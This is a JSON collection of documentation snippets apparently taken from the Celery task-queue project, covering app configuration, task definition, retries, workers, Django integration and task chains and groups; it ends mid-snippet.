[
  {
    "owner": "celery",
    "repo": "celery",
    "content": "TITLE: Configuring Celery with Redis Result Backend\nDESCRIPTION: Python code to configure Celery application with Redis as result backend and RabbitMQ as message broker.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\napp = Celery('tasks', backend='redis://localhost', broker='pyamqp://')\n```\n\n----------------------------------------\n\nTITLE: Defining a Bound Celery Task in Python\nDESCRIPTION: Shows how to create a bound task by setting `bind=True` in the `@app.task` decorator. This injects the task instance as the first argument (`self`), allowing access to task context (like `self.request.id`) and methods like `self.retry()`. It uses `get_task_logger` for task-specific logging.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nlogger = get_task_logger(__name__)\n\n@app.task(bind=True)\ndef add(self, x, y):\n    logger.info(self.request.id)\n```\n\n----------------------------------------\n\nTITLE: Creating a Celery Application and Task in Python\nDESCRIPTION: Python code to create a Celery application instance and define a simple addition task. This sets up the basic structure for using Celery in a project.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\n\napp = Celery('tasks', broker='pyamqp://guest@localhost//')\n\n@app.task\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Initializing a Simple Celery Application in Python\nDESCRIPTION: This snippet demonstrates how to create a basic Celery application and define a task. It initializes the Celery app with a broker URL and defines a simple 'hello' task that returns a string.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/introduction.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\n\napp = Celery('hello', broker='amqp://guest@localhost//')\n\n@app.task\ndef hello():\n    return 'hello world'\n```\n\n----------------------------------------\n\nTITLE: Setting Django Environment and Celery App Configuration\nDESCRIPTION: Sets up the Django environment and creates a Celery app instance with Django settings integration. Includes environment configuration and auto-discovery of tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/django/first-steps-with-django.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nos.environ.setdefault('DJANGO_SETTINGS_MODULE', 'proj.settings')\n\napp = Celery('proj')\n\napp.config_from_object('django.conf:settings', namespace='CELERY')\n\napp.autodiscover_tasks()\n```\n\n----------------------------------------\n\nTITLE: Defining a Basic Celery Task with Decorator in Python\nDESCRIPTION: Illustrates the fundamental usage of the `@app.task` decorator to turn a Python function (`create_user`) into a Celery task. It assumes a Celery application instance named `app` is available and imports a Django model `User` to perform a database operation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nfrom .models import User\n\n@app.task\ndef create_user(username, password):\n    User.objects.create(username=username, password=password)\n```\n\n----------------------------------------\n\nTITLE: Using delay_on_commit for Safe Task Execution in Django Transactions\nDESCRIPTION: This snippet demonstrates the use of delay_on_commit to safely execute a Celery task after a database transaction has been committed in Django 1.9+.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_50\n\nLANGUAGE: python\nCODE:\n```\nfrom django.db import transaction\nfrom django.http import HttpResponseRedirect\n\n@transaction.atomic\ndef create_article(request):\n    article = Article.objects.create()\n    expand_abbreviations.delay_on_commit(article.pk)\n    return HttpResponseRedirect('/articles/')\n```\n\n----------------------------------------\n\nTITLE: Example Celery Configuration Module in Python\nDESCRIPTION: This snippet provides an example of a Celery configuration module (celeryconfig.py) with settings for broker URL, result backend, task serializer, result serializer, accepted content types, timezone, and UTC.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nbroker_url = 'pyamqp://'\nresult_backend = 'rpc://'\n\ntask_serializer = 'json'\nresult_serializer = 'json'\naccept_content = ['json']\ntimezone = 'Europe/Oslo'\nenable_utc = True\n```\n\n----------------------------------------\n\nTITLE: Starting Celery Worker from Command Line\nDESCRIPTION: Command to start a Celery worker process with INFO level logging.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj worker -l INFO\n```\n\n----------------------------------------\n\nTITLE: Verifying Celery Configuration File in Console\nDESCRIPTION: This console command demonstrates how to verify that a Celery configuration file works properly and doesn't contain any syntax errors by importing it.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_12\n\nLANGUAGE: console\nCODE:\n```\n$ python -m celeryconfig\n```\n\n----------------------------------------\n\nTITLE: Implementing Exponential Backoff for API-Dependent Celery Tasks\nDESCRIPTION: Example of a Celery task with exponential backoff retry strategy, suitable for tasks that depend on external APIs. This configuration automatically increases the delay between retry attempts to avoid overwhelming the external service.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_24\n\nLANGUAGE: python\nCODE:\n```\nfrom requests.exceptions import RequestException\n\n@app.task(autoretry_for=(RequestException,), retry_backoff=True)\ndef x():\n    ...\n```\n\n----------------------------------------\n\nTITLE: Database Connection Caching in Custom Task Class\nDESCRIPTION: Demonstrates how to create a base Task class that caches a database connection. The connection is lazily initialized and maintained across task invocations within the same worker process.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_38\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Task\n\nclass DatabaseTask(Task):\n    _db = None\n\n    @property\n    def db(self):\n        if self._db is None:\n            self._db = Database.connect()\n        return self._db\n```\n\n----------------------------------------\n\nTITLE: Setting Celery Configuration Options\nDESCRIPTION: Python code demonstrating how to set Celery configuration options directly on the application instance.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\napp.conf.task_serializer = 'json'\n```\n\n----------------------------------------\n\nTITLE: Remote Worker Shutdown with Python\nDESCRIPTION: Python code to remotely shut down workers using the control interface. Shows how to shut down all workers or target specific workers for graceful shutdown.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_39\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.control.broadcast('shutdown') # shutdown all workers\n>>> app.control.broadcast('shutdown', destination='worker1@example.com')\n```\n\n----------------------------------------\n\nTITLE: Django View for Adding Comments with Asynchronous Spam Filtering\nDESCRIPTION: This snippet shows a Django view that handles comment submission and triggers an asynchronous spam filtering task.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_53\n\nLANGUAGE: python\nCODE:\n```\nfrom django import forms\nfrom django.http import HttpResponseRedirect\nfrom django.template.context import RequestContext\nfrom django.shortcuts import get_object_or_404, render_to_response\n\nfrom blog import tasks\nfrom blog.models import Comment\n\n\nclass CommentForm(forms.ModelForm):\n\n    class Meta:\n        model = Comment\n\n\ndef add_comment(request, slug, template_name='comments/create.html'):\n    post = get_object_or_404(Entry, slug=slug)\n    remote_addr = request.META.get('REMOTE_ADDR')\n\n    if request.method == 'post':\n        form = CommentForm(request.POST, request.FILES)\n        if form.is_valid():\n            comment = form.save()\n            # Check spam asynchronously.\n            tasks.spam_filter.delay(comment_id=comment.id,\n                                    remote_addr=remote_addr)\n            return HttpResponseRedirect(post.get_absolute_url())\n    else:\n        form = CommentForm()\n\n    context = RequestContext(request, {'form': form})\n    return render_to_response(template_name, context_instance=context)\n```\n\n----------------------------------------\n\nTITLE: Running Redis with Docker\nDESCRIPTION: Docker command to run Redis message broker in a container, exposing port 6379.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n$ docker run -d -p 6379:6379 redis\n```\n\n----------------------------------------\n\nTITLE: Invoking Celery Task Using a Signature Object in Python\nDESCRIPTION: Utilizes the signature (s) interface to construct a chainable Celery task invocation, demonstrating argument passing and async execution via apply_async. This is useful for advanced task routing and serialization. Requires the task object and its registration in the Celery app.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\ntask.s(arg1, arg2, kwarg1='x', kwargs2='y').apply_async()\n```\n\n----------------------------------------\n\nTITLE: Setting Timeouts for Network Requests in Celery Tasks using Python\nDESCRIPTION: Demonstrates how to set connect and read timeouts for an HTTP GET request using the `requests` library within a Celery task. This is crucial to prevent tasks from blocking indefinitely on I/O operations. Requires the `requests` library to be installed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nconnect_timeout, read_timeout = 5.0, 30.0\nresponse = requests.get(URL, timeout=(connect_timeout, read_timeout))\n```\n\n----------------------------------------\n\nTITLE: Calling Celery Task with Apply Async Method in Python\nDESCRIPTION: Illustrates calling a Celery task via the apply_async method, allowing explicit specification of positional and keyword arguments. This pattern supports execution options unavailable in delay. Requires a registered Celery 'task' object and produces a task asynchronously executed by a worker.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\ntask.apply_async(args=[arg1, arg2], kwargs={'kwarg1': 'x', 'kwarg2': 'y'})\n```\n\n----------------------------------------\n\nTITLE: Celery Task for Spam Filtering Using Akismet\nDESCRIPTION: This snippet defines a Celery task that uses the Akismet service to filter spam in blog comments asynchronously.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_54\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\n\nfrom akismet import Akismet\n\nfrom django.core.exceptions import ImproperlyConfigured\nfrom django.contrib.sites.models import Site\n\nfrom blog.models import Comment\n\n\napp = Celery(broker='amqp://')\n\n\n@app.task\ndef spam_filter(comment_id, remote_addr=None):\n    logger = spam_filter.get_logger()\n    logger.info('Running spam filter for comment %s', comment_id)\n\n    comment = Comment.objects.get(pk=comment_id)\n    current_domain = Site.objects.get_current().domain\n    akismet = Akismet(settings.AKISMET_KEY, 'http://{0}'.format(domain))\n    if not akismet.verify_key():\n        raise ImproperlyConfigured('Invalid AKISMET_KEY')\n\n\n    is_spam = akismet.comment_check(user_ip=remote_addr,\n                        comment_content=comment.comment,\n                        comment_author=comment.name,\n                        comment_author_email=comment.email_address)\n    if is_spam:\n        comment.is_spam = True\n        comment.save()\n\n    return is_spam\n```\n\n----------------------------------------\n\nTITLE: Unit Testing Celery Task Success with Mocking in Python\nDESCRIPTION: Demonstrates a unit test for the `send_order` task's success scenario using `unittest.mock.patch`. It patches the `Product.order` method within the task's module (`proj.tasks`) to isolate the test from the actual database interaction. The test verifies that `product.order` is called with the expected arguments.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nfrom pytest import raises\n\nfrom celery.exceptions import Retry\n\n# for python 2: use mock.patch from `pip install mock`.\nfrom unittest.mock import patch\n\nfrom proj.models import Product\nfrom proj.tasks import send_order\n\nclass test_send_order:\n\n    @patch('proj.tasks.Product.order')  # < patching Product in module above\n    def test_success(self, product_order):\n        product = Product.objects.create(\n            name='Foo',\n        )\n        send_order(product.pk, 3, Decimal(30.3))\n        product_order.assert_called_with(3, Decimal(30.3))\n```\n\n----------------------------------------\n\nTITLE: Starting a Basic Celery Worker (Console)\nDESCRIPTION: This command starts a Celery worker for the specified project (`proj`) in the foreground. It sets the logging level to INFO. This is the fundamental command to initiate a worker process.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj worker -l INFO\n```\n\n----------------------------------------\n\nTITLE: Example Celery Configuration File in Python\nDESCRIPTION: This snippet demonstrates a basic `celeryconfig.py` file. It configures the message broker connection using `broker_url` (pointing to a local AMQP instance), specifies the task modules to be imported when a worker starts using `imports`, sets the result backend to use a SQLite database file (`results.db`) for storing task states and results via `result_backend`, and applies a rate limit annotation of 10 tasks per second to the 'tasks.add' task using `task_annotations`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n## Broker settings.\nbroker_url = 'amqp://guest:guest@localhost:5672//'\n\n# List of modules to import when the Celery worker starts.\nimports = ('myapp.tasks',)\n\n## Using the database to store task state and results.\nresult_backend = 'db+sqlite:///results.db'\n\ntask_annotations = {'tasks.add': {'rate_limit': '10/s'}}\n\n```\n\n----------------------------------------\n\nTITLE: Stateful Task Class in Celery\nDESCRIPTION: Shows how to create a stateful task class that maintains state between task executions in the same worker process. This example implements a simple authentication task that keeps user credentials in memory.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_37\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Task\n\nclass NaiveAuthenticateServer(Task):\n\n    def __init__(self):\n        self.users = {'george': 'password'}\n\n    def run(self, username, password):\n        try:\n            return self.users[username] == password\n        except KeyError:\n            return False\n```\n\n----------------------------------------\n\nTITLE: Running Celery Worker\nDESCRIPTION: Command to start a Celery worker process, specifying the application module and log level.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_5\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A tasks worker --loglevel=INFO\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Retry Parameters with autoretry_for in Celery\nDESCRIPTION: Example of a Celery task with automatic retry that includes custom retry parameters. This task will retry up to 5 times when FailWhaleError is raised, demonstrating how to customize the retry behavior beyond default settings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_21\n\nLANGUAGE: python\nCODE:\n```\n@app.task(autoretry_for=(FailWhaleError,),\n          retry_kwargs={'max_retries': 5})\ndef refresh_timeline(user):\n    return twitter.refresh_timeline(user)\n```\n\n----------------------------------------\n\nTITLE: Creating a Simple Celery Application with Task Definition in Python\nDESCRIPTION: This code snippet demonstrates the basic setup of a Celery application by creating an instance with a broker URL and defining a simple 'hello world' task using a decorator. It shows the minimal configuration needed to get started with Celery.\nSOURCE: https://github.com/celery/celery/blob/main/docs/includes/introduction.txt#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\n\napp = Celery('hello', broker='amqp://guest@localhost//')\n\n@app.task\ndef hello():\n    return 'hello world'\n```\n\n----------------------------------------\n\nTITLE: Django Celery Settings Configuration\nDESCRIPTION: Example Django settings for Celery configuration including timezone, task tracking and time limits.\nSOURCE: https://github.com/celery/celery/blob/main/docs/django/first-steps-with-django.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nCELERY_TIMEZONE = \"Australia/Tasmania\"\nCELERY_TASK_TRACK_STARTED = True\nCELERY_TASK_TIME_LIMIT = 30 * 60\n```\n\n----------------------------------------\n\nTITLE: Defining a Celery Task with a Custom Base Class in Python\nDESCRIPTION: Illustrates defining a custom task class (`MyTask`) by inheriting from `celery.Task` and overriding methods like `on_failure`. This custom class is then used as the base for a specific task (`add`) by passing it to the `base` argument of the `@app.task` decorator.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nimport celery\n\nclass MyTask(celery.Task):\n\n    def on_failure(self, exc, task_id, args, kwargs, einfo):\n        print('{0!r} failed: {1!r}'.format(task_id, exc))\n\n@app.task(base=MyTask)\ndef add(x, y):\n    raise KeyError()\n```\n\n----------------------------------------\n\nTITLE: Executing Article Abbreviation Expansion Task\nDESCRIPTION: This snippet shows how to call the abbreviation expansion task, which could lead to a race condition if the article is modified before the task executes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_47\n\nLANGUAGE: python\nCODE:\n```\n>>> article = Article.objects.get(id=102)\n>>> expand_abbreviations.delay(article)\n```\n\n----------------------------------------\n\nTITLE: Creating Celery Task Signature with Keyword Arguments in Python\nDESCRIPTION: Demonstrates using the `s()` shortcut to create a Celery task signature that includes both positional arguments `(2, 2)` and keyword arguments (`debug=True`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_3\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.s(2, 2, debug=True)\ntasks.add(2, 2, debug=True)\n```\n\n----------------------------------------\n\nTITLE: Starting a Celery Worker for Django Project (Console)\nDESCRIPTION: Launches a Celery worker associated with the Django project named 'proj'. The `-A proj` flag specifies the Celery application instance located within the 'proj' directory/package, and `-l INFO` sets the logging level to INFO. Requires the Celery library, a configured Django project, a running message broker (like RabbitMQ), and execution from the project's root directory.\nSOURCE: https://github.com/celery/celery/blob/main/examples/django/README.rst#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj worker -l INFO\n```\n\n----------------------------------------\n\nTITLE: Defining a Reusable Celery Task with @shared_task in Python\nDESCRIPTION: Introduces the `@shared_task` decorator from the `celery` library. This allows defining tasks without depending on a specific Celery application instance, making them suitable for use in reusable Django apps or libraries.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import shared_task\n\n@shared_task\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Defining a Simple Celery Task in Python\nDESCRIPTION: Demonstrates how to define a basic Celery task using the @app.task decorator. The task returns a list of two sums.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_61\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef temp():\n    return [tsum(range(10)), tsum(range(100))]\n```\n\n----------------------------------------\n\nTITLE: Scheduling a Celery Task with Countdown in Pycon\nDESCRIPTION: Shows an interactive Python session using Celery to enqueue a task with a countdown delay, causing it to execute after a specified number of seconds. This approach provides basic deferred execution using apply_async and a numeric countdown parameter. Requires a properly configured Celery task, e.g., add.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_10\n\nLANGUAGE: pycon\nCODE:\n```\n>>> result = add.apply_async((2, 2), countdown=3)\n>>> result.get()    # this takes at least 3 seconds to return\n4\n```\n\n----------------------------------------\n\nTITLE: Registering Periodic Tasks Programmatically using Celery in Python\nDESCRIPTION: This code shows how to programmatically register multiple periodic tasks in Celery using the `on_after_configure` signal handler. Tasks are scheduled using both interval (seconds) and crontab-based approaches, with names to avoid accidental replacement. The example defines simple `test` and `add` task functions for demonstration. Celery must be installed, and this setup should be used in your Celery application initialization.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\nfrom celery.schedules import crontab\n\napp = Celery()\n\n@app.on_after_configure.connect\ndef setup_periodic_tasks(sender: Celery, **kwargs):\n    # Calls test('hello') every 10 seconds.\n    sender.add_periodic_task(10.0, test.s('hello'), name='add every 10')\n\n    # Calls test('hello') every 30 seconds.\n    # It uses the same signature of previous task, an explicit name is\n    # defined to avoid this task replacing the previous one defined.\n    sender.add_periodic_task(30.0, test.s('hello'), name='add every 30')\n\n    # Calls test('world') every 30 seconds\n    sender.add_periodic_task(30.0, test.s('world'), expires=10)\n\n    # Executes every Monday morning at 7:30 a.m.\n    sender.add_periodic_task(\n        crontab(hour=7, minute=30, day_of_week=1),\n        test.s('Happy Mondays!'),\n    )\n\n@app.task\ndef test(arg):\n    print(arg)\n\n@app.task\ndef add(x, y):\n    z = x + y\n    print(z)\n```\n\n----------------------------------------\n\nTITLE: Enabling Late Acknowledgment and Disabling Prefetch in Workers (Python)\nDESCRIPTION: This snippet provides the recommended Celery configuration for enabling late task acknowledgment (task_acks_late) and limiting worker prefetching to one (worker_prefetch_multiplier = 1). This setup ensures that workers commit to processing at most one unacknowledged task per process, enabling reliable retries on failure while requiring tasks to be idempotent. Both parameters are standard Celery settings placed in the project configuration file.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/optimizing.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\ntask_acks_late = True\\nworker_prefetch_multiplier = 1\\n\n```\n\n----------------------------------------\n\nTITLE: Creating a Simple Celery Task Chain in Python\nDESCRIPTION: Shows how to use the `celery.chain` primitive to link multiple task signatures together sequentially. The output of one task becomes the input of the next. Here, `add.s(2, 2)`, `add.s(4)`, and `add.s(8)` are chained.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_24\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import chain\n\n>>> # 2 + 2 + 4 + 8\n>>> res = chain(add.s(2, 2), add.s(4), add.s(8))()\n>>> res.get()\n16\n```\n\n----------------------------------------\n\nTITLE: Retrieving Task Results in Celery (Python)\nDESCRIPTION: Demonstrates how to retrieve the result of a Celery task using the delay() method and get() function. Also shows how to access the task ID and handle exceptions.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_6\n\nLANGUAGE: pycon\nCODE:\n```\n>>> res = add.delay(2, 2)\n>>> res.get(timeout=1)\n4\n\n>>> res.id\nd6b3aea2-fb9b-4ebc-8da4-848818db9114\n\n>>> res = add.delay(2, '2')\n>>> res.get(timeout=1)\n```\n\nLANGUAGE: pytb\nCODE:\n```\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"celery/result.py\", line 221, in get\n    return self.backend.wait_for_pending(\n  File \"celery/backends/asynchronous.py\", line 195, in wait_for_pending\n    return result.maybe_throw(callback=callback, propagate=propagate)\n  File \"celery/result.py\", line 333, in maybe_throw\n    self.throw(value, self._to_remote_traceback(tb))\n  File \"celery/result.py\", line 326, in throw\n    self.on_ready.throw(*args, **kwargs)\n  File \"vine/promises.py\", line 244, in throw\n    reraise(type(exc), exc, tb)\n  File \"vine/five.py\", line 195, in reraise\n    raise value\nTypeError: unsupported operand type(s) for +: 'int' and 'str'\n```\n\n----------------------------------------\n\nTITLE: Getting Scheduled Tasks from Workers\nDESCRIPTION: Python code to retrieve scheduled (ETA) tasks from workers using the inspect interface. Shows how to get information about tasks scheduled to run at a specific time.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_36\n\nLANGUAGE: pycon\nCODE:\n```\n>>> i.scheduled()\n[{'worker1.example.com':\n    [{'eta': '2010-06-07 09:07:52', 'priority': 0,\n      'request': {\n        'name': 'tasks.sleeptask',\n        'id': '1a7980ea-8b19-413e-91d2-0b74f3844c4d',\n        'args': '[1]',\n        'kwargs': '{}'}},\n     {'eta': '2010-06-07 09:07:53', 'priority': 0,\n      'request': {\n        'name': 'tasks.sleeptask',\n        'id': '49661b9a-aa22-4120-94b7-9ee8031d219d',\n        'args': '[2]',\n        'kwargs': '{}'}}]}]\n```\n\n----------------------------------------\n\nTITLE: Using Immutable Signatures in a Celery Chain in Python\nDESCRIPTION: Illustrates chaining immutable signatures created with `si()`. Each task in the chain executes with its predefined arguments, ignoring the result of the previous task. The example shows retrieving the final result and results of parent tasks in the chain.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_28\n\nLANGUAGE: pycon\nCODE:\n```\n>>> res = (add.si(2, 2) | add.si(4, 4) | add.si(8, 8))()\n>>> res.get()\n16\n\n>>> res.parent.get()\n8\n\n>>> res.parent.parent.get()\n4\n```\n\n----------------------------------------\n\nTITLE: Using Django transaction.on_commit with Celery tasks\nDESCRIPTION: Example of using Django's transaction.on_commit to ensure a Celery task is only executed after a database transaction is committed successfully. This helps avoid issues with tasks operating on uncommitted data.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom functools import partial\nfrom django.db import transaction\n\nfrom .models import Article, Log\nfrom .tasks import send_article_created_notification\n\ndef create_article(request):\n    with transaction.atomic():\n        article = Article.objects.create(**request.POST)\n        # send this task only if the rest of the transaction succeeds.\n        transaction.on_commit(partial(\n```\n\n----------------------------------------\n\nTITLE: Accessing Task Context in a Bound Task with Python\nDESCRIPTION: Example of a bound task that accesses information from the task context. The bind=True parameter makes the function a bound method, allowing access to task instance attributes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\n@app.task(bind=True)\ndef dump_context(self, x, y):\n    print('Executing task id {0.id}, args: {0.args!r} kwargs: {0.kwargs!r}'.format(\n            self.request))\n```\n\n----------------------------------------\n\nTITLE: Setting Celery Task Rate Limit at Runtime via Console\nDESCRIPTION: This console command shows how to set a new rate limit for a task at runtime using the celery control command.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_15\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A tasks control rate_limit tasks.add 10/m\nworker@example.com: OK\n    new rate limit set successfully\n```\n\n----------------------------------------\n\nTITLE: Configuring Automatic Retry for Specific Exceptions in Celery\nDESCRIPTION: Example of a Celery task that automatically retries when a specific exception (FailWhaleError) is raised, without requiring explicit exception handling code. This approach simplifies task implementation by handling retries at the decorator level.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_20\n\nLANGUAGE: python\nCODE:\n```\nfrom twitter.exceptions import FailWhaleError\n\n@app.task(autoretry_for=(FailWhaleError,))\ndef refresh_timeline(user):\n    return twitter.refresh_timeline(user)\n```\n\n----------------------------------------\n\nTITLE: Creating and Executing Groups in Celery Python\nDESCRIPTION: Shows how to create and execute groups of tasks in Celery for parallel execution. It also demonstrates how to work with group results.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_45\n\nLANGUAGE: python\nCODE:\n```\n>>> from celery import group\n>>> from proj.tasks import add\n\n>>> group(add.s(2, 2), add.s(4, 4))\n(proj.tasks.add(2, 2), proj.tasks.add(4, 4))\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> g = group(add.s(2, 2), add.s(4, 4))\n>>> res = g()\n>>> res.get()\n[4, 8]\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> group(add.s(i, i) for i in range(100))()\n```\n\n----------------------------------------\n\nTITLE: Defining Django Model and Task for Article Abbreviation Expansion\nDESCRIPTION: This snippet defines a Django model for an Article and a Celery task to expand abbreviations in the article body. It demonstrates a potential race condition when passing model objects to tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_46\n\nLANGUAGE: python\nCODE:\n```\nclass Article(models.Model):\n    title = models.CharField()\n    body = models.TextField()\n\n@app.task\ndef expand_abbreviations(article):\n    article.body.replace('MyCorp', 'My Corporation')\n    article.save()\n```\n\n----------------------------------------\n\nTITLE: Creating Group Tasks in Celery Python\nDESCRIPTION: Demonstrates how to create a group of tasks in Celery for parallel execution.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_47\n\nLANGUAGE: python\nCODE:\n```\n>>> from celery import group\n>>> from tasks import add\n\n>>> job = group([\n...             add.s(2, 2),\n...             add.s(4, 4),\n...             add.s(8, 8),\n...             add.s(16, 16),\n...             add.s(32, 32),\n... ])\n```\n\n----------------------------------------\n\nTITLE: Instantiating a Celery Application in Python Interactive Shell\nDESCRIPTION: Demonstrates the process of importing the Celery class and creating a new application instance interactively. No dependencies beyond the Celery package are required. The code shows the application's default textual representation, which includes the app class, main module name, and memory address. Intended for getting started in Python REPL sessions; the output will vary per session/context.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_0\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import Celery\n>>> app = Celery()\n>>> app\n<Celery __main__:0x100469fd0>\n```\n\n----------------------------------------\n\nTITLE: Creating and Starting a Celery Worker in a Python Module\nDESCRIPTION: Defines a standard pattern for encapsulating Celery app setup and task definition within a Python module file, and demonstrates running the worker from the main entry point. Prerequisites: celery package installed, proper module/script execution. Key parameters are the worker command-line args passed to worker_main. 'add' sums two arguments as a simple test task. Intended for demonstration/testing of Celery worker invocation from a script file context.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\napp = Celery()\n\n@app.task\ndef add(x, y): return x + y\n\nif __name__ == '__main__':\n    args = ['worker', '--loglevel=INFO']\n    app.worker_main(argv=args)\n```\n\n----------------------------------------\n\nTITLE: Task Decorator with Custom Base Class\nDESCRIPTION: Best practice example of using custom task classes with the task decorator\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n@app.task(bind=True, base=CustomTask)\ndef custom(self):\n    print('running')\n```\n\n----------------------------------------\n\nTITLE: Using Chain Primitives in Celery (Python)\nDESCRIPTION: Demonstrates how to use Celery's chain primitive to link tasks together sequentially.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_10\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from 